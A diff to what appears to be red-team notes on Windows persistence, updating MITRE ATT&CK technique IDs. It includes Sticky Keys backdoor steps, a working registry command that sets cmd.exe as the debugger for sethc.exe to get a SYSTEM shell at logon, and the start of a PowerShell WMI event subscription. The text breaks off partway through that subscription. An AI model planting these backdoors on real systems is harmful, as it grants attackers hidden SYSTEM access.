@@ -1,16 +1,16 @@
 # Other Persistence Techniques
 
-## Sticky Keys Backdoor (T1015)
+## Sticky Keys Backdoor (T1546.008)
 - Replace sethc.exe with cmd.exe (change ownership from TrustedInstaller first)
 - Hit Shift 5 times on logon screen to get SYSTEM shell
 - Also works with utilman.exe (Win+U on logon screen)
 
-## Image File Execution Options (T1183)
+## Image File Execution Options (T1546.012)
 ```cmd
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"
 ```
 
-## WMI Event Subscription (T1084)
+## WMI Event Subscription (T1546.003)
 ```powershell
 # Create filter (trigger on boot after 20min uptime)
 $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{
